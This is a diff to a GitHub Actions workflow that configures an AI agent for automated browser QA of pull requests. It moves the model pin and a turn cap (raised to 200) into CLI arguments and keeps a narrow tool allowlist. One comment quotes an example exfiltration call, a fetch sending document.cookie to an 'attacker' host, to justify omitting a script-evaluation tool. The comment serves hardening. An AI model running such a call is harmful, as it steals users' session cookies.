@@ -309,17 +309,10 @@ jobs:
         with:
           github_token: ${{ secrets.GITHUB_TOKEN }}
           anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
-          # Pin the model so a future action-default change doesn't silently swap us to a different
-          # tier. Opus 4.7 with the 1M-context variant — observed quality is high enough to catch
-          # subtle issues like missing data-cy attributes that a smaller model might miss. Cost is
-          # the main reason to consider Sonnet later; quality on this task is the reason to stay Opus.
-          model: claude-opus-4-7-1m
-          # Defensive cap on Anthropic credit spend per run. The observed PASS run on PR #4147 took
-          # ~25-40 tool-use turns (read skill, read PR diff, read issue, ~20 browser_* calls, write
-          # report). 100 leaves ~2x headroom for complex multi-criterion tickets while well under
-          # the 25-min job timeout's natural cap. If a real run hits 100, that's a signal worth a
-          # manual look (either the ticket is unusually complex or the agent looped).
-          max_turns: 100
+          # NOTE on `model` / `max_turns` placement: the action.yml does NOT declare these as
+          # top-level inputs (confirmed via the action's inputs schema at the pinned SHA). Setting
+          # them as top-level `with:` keys is silently ignored. The canonical way to pass them is
+          # as SDK flags inside `claude_args` — see `--model` and `--max-turns` below.
           # SKILL.md is staged to $RUNNER_TEMP/qa-skill.md by the previous step. The action restores
           # .claude/ from origin/dev before the agent runs, so the in-repo path may not exist; the
           # staged copy is the authoritative source for this run.
@@ -358,7 +351,17 @@ jobs:
           # the primary un-coverable exfil channel (`fetch('https://attacker', {body:document.cookie})`)
           # and the CI skill path doesn't need it — auth comes via storage-state, not document.cookie.
           # Keep it omitted unless a concrete read-only verification needs it.
+          #
+          # --model: pin Opus 4.7 (1M-context variant) so a future action-default change doesn't
+          #   silently swap us to a different tier. Opus's judgment is high enough to catch subtle
+          #   issues (e.g. missing data-cy attributes on PR #4147) that a smaller model might miss.
+          # --max-turns: defensive cap on Anthropic credit spend per run. The observed PASS run on
+          #   PR #4147 took ~25-40 turns; 200 leaves ~5x headroom for complex multi-criterion
+          #   tickets while well under the 25-min job timeout's natural cap. If a real run hits
+          #   200, that's a signal worth a manual look (ticket unusually complex or agent looped).
           claude_args: |
+            --model claude-opus-4-7-1m
+            --max-turns 200
             --mcp-config '{"mcpServers":{"playwright":{"command":"npx","args":["-y","@playwright/mcp@${{ env.MCP_VERSION }}","--headless","--isolated","--no-sandbox","--storage-state","${{ runner.temp }}/storage_state.json"]}}}'
             --allowedTools "Bash(gh pr diff:*),Bash(gh pr view:*),Bash(gh issue view:*),Read,Write,Grep,Glob,mcp__playwright__browser_navigate,mcp__playwright__browser_snapshot,mcp__playwright__browser_click,mcp__playwright__browser_type,mcp__playwright__browser_fill_form,mcp__playwright__browser_select_option,mcp__playwright__browser_hover,mcp__playwright__browser_press_key,mcp__playwright__browser_wait_for,mcp__playwright__browser_console_messages,mcp__playwright__browser_network_requests"
 
